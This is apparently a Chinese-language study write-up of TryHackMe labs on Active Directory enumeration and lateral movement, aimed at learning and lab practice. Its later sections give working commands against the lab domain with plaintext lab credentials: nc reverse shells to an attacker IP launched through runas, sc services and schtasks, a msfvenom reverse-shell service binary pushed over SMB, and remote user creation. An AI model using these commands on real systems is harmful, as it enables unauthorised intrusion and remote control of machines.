<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 获取用户的所有属性</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># -Properties * 是展示出所有的属性，另外可以手动指定</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADUser</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity gordon.stevens </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Properties </span><span style="color: #56B6C2">*</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 可以通过这种方法去过滤出需要的用户和要的信息</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADUser</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Filter </span><span style="color: #98C379">&#39;Name -like &quot;*stevens&quot;&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span><span style="color: #ABB2BF"> | </span><span style="color: #56B6C2">Format-Table</span><span style="color: #ABB2BF"> Name,SamAccountName </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">A</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 查看所有 AD 组</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Filter </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 查看 Administrators 组信息</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity Administrators </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 查看 AD 组成员</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity Administrators </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 获取 AD 对象</span></span>
<span class="line"><span style="color: #E06C75">$ChangeDate</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> DateTime(</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">02</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADObject</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Filter </span><span style="color: #98C379">&#39;whenChanged -gt $ChangeDate&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">includeDeletedObjects </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 找到错误密码次数大于 0 的用户</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADObject</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Filter </span><span style="color: #98C379">&#39;badPwdCount -gt 0&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 获取 AD 域的信息</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADDomain</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 给域内用户改密码</span></span>
<span class="line"><span style="color: #56B6C2">Set-ADAccountPassword</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity gordon.stevens </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">OldPassword (</span><span style="color: #56B6C2">ConvertTo-SecureString</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsPlaintext </span><span style="color: #98C379">&quot;old&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">force) </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NewPassword (</span><span style="color: #56B6C2">ConvertTo-SecureString</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsPlainText </span><span style="color: #98C379">&quot;new&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force)</span></span></code></pre></div></div></figure>

<p><strong>优点</strong></p>
<ul>
<li><strong>信息量更大</strong>：PowerShell 的 cmdlet（命令行工具）可以比命令提示符中的 <code>net</code> 命令枚举出多得多的信息。</li>
<li><strong>支持远程执行</strong>：即使在未加入域的机器上，我们也可以通过 <code>runas</code> 命令来指定服务器和域，从而执行这些命令。</li>
<li><strong>自定义 cmdlet</strong>：我们可以创建自己的 cmdlet 来枚举特定的信息。</li>
<li><strong>直接修改对象</strong>：我们可以使用 AD-RSAT cmdlet 直接修改 AD 对象，例如重置密码或将用户添加到特定组。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>更容易被监控</strong>：与命令提示符相比，PowerShell 通常受到蓝队（安全防御团队）更多的监控。</li>
<li><strong>需要安装工具</strong>：我们必须安装 AD-RSAT 工具，或者使用其他可能更容易被检测到的脚本来进行 PowerShell 枚举。</li>
</ul>
<h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>一种图形化分析工具，能图形化的分析域内的信息。然后要用到一个 Sharphound 工具，他是用来收集信息的。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">Sharphound.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> --</span><span style="color: #E06C75">CollectionMethods</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">All</span><span style="color: #ABB2BF"> --</span><span style="color: #E06C75">Domain</span><span style="color: #ABB2BF"> za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF"> --</span><span style="color: #E06C75">ExcludeDCs</span></span></code></pre></div></div></figure>

<ul>
<li>CollectionMethods：第一次运行之后， 如果只要收集 Session，只运行 Session 即可。也就是提取用户当前登录机器的会话</li>
<li>Domain：指定要收集的域</li>
<li>ExcludeDcs：让工具不要去操作 DC，容易引起警报</li>
</ul>
<p>Bloodhound 依赖 neo4j 数据库，初次使用要部署一下，然后就是软件的基本使用了。这里用的是 v4 版本，说实话不好用，而且文档也不见了，新版的 Bloodhound 又分为社区版和商业版，之后再去研究，<del>感觉用不上</del>（我错了）。</p>
<p><strong>优点</strong></p>
<ul>
<li><strong>提供图形化界面</strong>：为活动目录（AD）枚举提供了图形用户界面。</li>
<li><strong>展示攻击路径</strong>：能够展示已枚举的活动目录信息中的潜在攻击路径。</li>
<li><strong>更深入的洞察</strong>：提供了对活动目录对象更深入的洞察，这些信息通常需要通过多次手动查询才能获取。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>需要执行 Sharphound</strong>：它的使用需要执行 Sharphound，这个过程会产生较多噪音，并且常常会被防病毒（AV）或端点检测与响应（EDR）解决方案检测到。</li>
</ul>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>枚举 AD 是一项庞大的工作。为了更好地理解域的内部结构，并找出可以利用来进行特权提升或横向移动的攻击路径，进行全面的 AD 枚举是必不可少的。</p>
<h3 id="其他的枚举技术"><a href="#其他的枚举技术" class="headerlink" title="其他的枚举技术"></a>其他的枚举技术</h3><ul>
<li>LDAP 枚举</li>
<li><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a></li>
</ul>
<h3 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h3><ul>
<li>监控事件<ul>
<li>AD 枚举技术会产生一堆 logon 事件，都是从一个 AD 用户发起的，能编写一个检测规则去识别这种攻击</li>
</ul>
</li>
<li>检测特定软件的签名</li>
<li>监控 CMD 和 PowerShell</li>
</ul>
<hr>
<h1 id="Lateral-Movement-and-Pivoting"><a href="#Lateral-Movement-and-Pivoting" class="headerlink" title="Lateral Movement and Pivoting"></a>Lateral Movement and Pivoting</h1><p>房间：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/lateralmovementandpivoting">https://tryhackme.com/room/lateralmovementandpivoting</a></p>
<p>时间：20250803 14:00 - 20250804 15:00 </p>
<hr>
<p>这个房间是教横向移动的，也就是从系统里面提取高权限账户，达到拿下高权限机器的作用，主要用的是 Hash 提取，还有 Kerberos。</p>
<p>本地账户只能通过 RDP 去操作有 UAC 的行为，类似 RPC&#x2F;SMB&#x2F;WinRM 之类的操作渠道不行，但是域账户不受限制，还有默认的 Administrator 用户。</p>
<h2 id="远程执行进程"><a href="#远程执行进程" class="headerlink" title="远程执行进程"></a>远程执行进程</h2><p>下面的技术都有不同的方法去实现相同的目的，有一些可能更加适合某些场景。</p>
<h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><ul>
<li><strong>Ports:</strong> 445&#x2F;TCP (SMB)</li>
<li><strong>Required Group Memberships:</strong> Administrators</li>
</ul>
<p>Psexec 是多年来远程执行命令的首选，他允许管理员用户在其可访问的 PC 上远程执行命令，他是许多系统工具之一。</p>
<p><strong>他的工作流如下</strong>：连接到 $Admin 共享文件夹上传可执行的服务（PSEXESVC.exe） -&gt; 创建然后执行服务（C:\Windows\psexesvc.exe） -&gt; 创建一个管道（\.\pipe\psexesvc\）</p>
<p>运行 psexec 我们只需要提供管理员的凭据和要运行的命令，如下。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">psexec64.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">MACHINE_IP</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">Administrator</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">Mypass123</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> cmd.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 使用 impacket 的 psexec</span></span>
<span class="line"><span style="color: #ABB2BF"># https://feifei.</span><span style="color: #E06C75">tw</span><span style="color: #ABB2BF">/</span><span style="color: #E06C75">impacket</span><span style="color: #ABB2BF">/</span></span>
<span class="line"><span style="color: #ABB2BF">python3 psexec.py ZA.TRYHACKME.</span><span style="color: #E06C75">COM</span><span style="color: #ABB2BF">/t1_leonard.summers:EZpass4ever@THMIIS.za.tryhackme.com</span></span></code></pre></div></div></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec">https://learn.microsoft.com/en-us/sysinternals/downloads/psexec</a></p>
<h3 id="使用-WinRM-创建远程进程"><a href="#使用-WinRM-创建远程进程" class="headerlink" title="使用 WinRM 创建远程进程"></a>使用 WinRM 创建远程进程</h3><ul>
<li><strong>Ports:</strong> 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS)</li>
<li><strong>Required Group Memberships:</strong> Remote Management Users</li>
</ul>
<p>他是一个基于 Web 的协议，可以远程发送 Powershell 命令给 Windows 主机。大多数 Windows Server 会默认开启 WinRM。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 通过 CMD 连接到远端 PowerShell 会话</span></span>
<span class="line"><span style="color: #56B6C2">winrs.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">u:</span><span style="color: #56B6C2">ZA.TRYHACKME.COM</span><span style="color: #ABB2BF">\t1_leonard.summers </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">p:EZpass4ever </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">r:</span><span style="color: #56B6C2">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> cmd</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 通过 PowerShell 连接到远端 PowerShell 会话</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 凭证需要处理一下</span></span>
<span class="line"><span style="color: #E06C75">$username</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ZA.TRYHACKME.COM\t1_leonard.summers&#39;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;EZpass4ever&#39;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">ConvertTo-SecureString</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsPlainText </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force; </span></span>
<span class="line"><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> System.Management.Automation.PSCredential </span><span style="color: #E06C75">$username</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 传递凭证连接到远端</span></span>
<span class="line"><span style="color: #56B6C2">Enter-PSSession</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Computername </span><span style="color: #56B6C2">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Credential </span><span style="color: #E06C75">$credential</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 直接在远端执行命令并且回显</span></span>
<span class="line"><span style="color: #56B6C2">Invoke-Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Computername </span><span style="color: #56B6C2">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Credential </span><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ScriptBlock {whoami}</span></span></code></pre></div></div></figure>

<h3 id="通过-sc-远程创建服务"><a href="#通过-sc-远程创建服务" class="headerlink" title="通过 sc 远程创建服务"></a>通过 sc 远程创建服务</h3><ul>
<li>Ports:<ul>
<li>135&#x2F;TCP, 49152-65535&#x2F;TCP (DCE&#x2F;RPC)</li>
<li>445&#x2F;TCP (RPC over SMB Named Pipes)</li>
<li>139&#x2F;TCP (RPC over SMB Named Pipes)</li>
</ul>
</li>
<li><strong>Required Group Memberships:</strong> Administrators</li>
</ul>
<p>Windows 服务也可以被用来执行任意命令，因为它们在启动时就会运行一个命令。虽然服务的可执行文件在技术上与常规应用程序不同，但如果我们配置一个 Windows 服务去运行任何应用程序，它仍然会执行它，然后在<strong>执行结束后失败</strong>。并不是没有执行成功，是因为服务没有收到预期的服务控制信号而报错。</p>
<h4 id="sc-的连接过程"><a href="#sc-的连接过程" class="headerlink" title="sc 的连接过程"></a>sc 的连接过程</h4><p>sc 会尝试通过 RPC 多种方式连接到 Service Control Manager (SVCCTL) </p>
<ol>
<li><strong>DCE&#x2F;RPC</strong> 协议连接。客户端会首先连接到 <strong>135</strong> 端口上的 <strong>Endpoint Mapper (EPM)</strong>。EPM 就像一个可用 <strong>RPC 端点</strong>的目录，客户端会向它查询 <strong>SVCCTL</strong> 服务的相关信息。随后，EPM 会回复连接 SVCCTL 服务的 <strong>IP 地址和端口号</strong>，这个端口号通常是 <strong>49152-65535</strong> 范围内的动态端口。</li>
<li>如果后续的那个 RPC 连接失败，sc 就会尝试通过 SMB 命名管道去请求 SVCCTL，445 端口或者 139（SMB over NetBIOS）。</li>
</ol>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 通过 sc 创建用户示例</span></span>
<span class="line"><span style="color: #ABB2BF"># 注意等号后面带空格是 sc 的特性</span></span>
<span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">TARGET</span><span style="color: #ABB2BF"> create THMservice </span><span style="color: #E06C75">binPath</span><span style="color: #ABB2BF">= </span><span style="color: #98C379">&quot;net user munra Pass123 /add&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">start</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75"> auto</span></span>
<span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">TARGET</span><span style="color: #ABB2BF"> start THMservice</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 利用 nc 反弹一个 shell 示例</span></span>
<span class="line"><span style="color: #ABB2BF"># 首先凭据注入一下 让注入好凭据的 shell 弹到我们的攻击机上</span></span>
<span class="line"><span style="color: #E06C75">runas</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:ZA.TRYHACKME.</span><span style="color: #E06C75">COM</span><span style="color: #ABB2BF">\t1_leonard.summers </span><span style="color: #98C379">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 4443&quot;</span></span>
<span class="line"><span style="color: #ABB2BF"># 再在 Shell 里面通过 sc 给目标机器创建服务</span></span>
<span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\THMIIS.za.tryhackme.com create THMserviceRe </span><span style="color: #E06C75">binPath</span><span style="color: #ABB2BF">= </span><span style="color: #98C379">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 4444&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">start</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75"> auto</span></span>
<span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\THMIIS.za.tryhackme.com start THMserviceRe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 停止和删除服务</span></span>
<span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">TARGET</span><span style="color: #ABB2BF"> stop THMservice</span></span>
<span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">TARGET</span><span style="color: #ABB2BF"> delete THMservice</span></span></code></pre></div></div></figure>

<h3 id="通过-schtasks-远程创建计划任务"><a href="#通过-schtasks-远程创建计划任务" class="headerlink" title="通过 schtasks 远程创建计划任务"></a>通过 schtasks 远程创建计划任务</h3><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># /</span><span style="color: #E06C75">sc</span><span style="color: #ABB2BF"> 是计划的类型 ONCE 是执行一次</span></span>
<span class="line"><span style="color: #ABB2BF"># 因为我们是手动执行他，所以时间不重要</span></span>
<span class="line"><span style="color: #E06C75">schtasks</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> THMIIS.za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">RU</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;SYSTEM&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">create</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">tn</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMtask1&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">tr</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 4444&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">sc</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ONCE</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">sd</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">1970</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">st</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF"> </span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 手动运行计划任务</span></span>
<span class="line"><span style="color: #ABB2BF"># 因为是计划任务，所以命令的回显不会显示</span></span>
<span class="line"><span style="color: #E06C75">schtasks</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> THMIIS.za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">run</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">TN</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMtask1&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 删除计划任务</span></span>
<span class="line"><span style="color: #E06C75">schtasks</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">S</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">TARGET</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">TN</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMtask1&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">DELETE</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">F</span></span></code></pre></div></div></figure>

<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 创建服务小马</span></span>
<span class="line"><span style="color: #E06C75">msfvenom</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">windows</span><span style="color: #ABB2BF">/</span><span style="color: #E06C75">shell</span><span style="color: #ABB2BF">/</span><span style="color: #E06C75">reverse_tcp</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">service</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">LHOST</span><span style="color: #ABB2BF">=</span><span style="color: #D19A66">10.50.46.241</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">LPORT</span><span style="color: #ABB2BF">=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">o</span><span style="color: #ABB2BF"> myservice666.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 传小马</span></span>
<span class="line"><span style="color: #E06C75">smbclient</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">&#39;put myservice666.exe&#39; -U t1_leonard.summers -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39; EZpass4ever</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 创建好 handler</span></span>
<span class="line"><span style="color: #E06C75">msfconsole</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">q</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 使用指定用户凭据反弹 Shell 回来</span></span>
<span class="line"><span style="color: #E06C75">runas</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:ZA.TRYHACKME.</span><span style="color: #E06C75">COM</span><span style="color: #ABB2BF">\t1_leonard.summers </span><span style="color: #98C379">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 4448&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 用 sc 创建服务</span></span>
<span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\thmiis.za.tryhackme.com create </span><span style="color: #E06C75">THMservice</span><span style="color: #D19A66">-666</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">binPath</span><span style="color: #ABB2BF">= </span><span style="color: #98C379">&quot;%windir%\myservice666.exe&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">start</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75"> auto</span></span>
<span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\thmiis.za.tryhackme.com start </span><span style="color: #E06C75">THMservice</span><span style="color: #D19A66">-666</span></span>
<span class="line"></span>
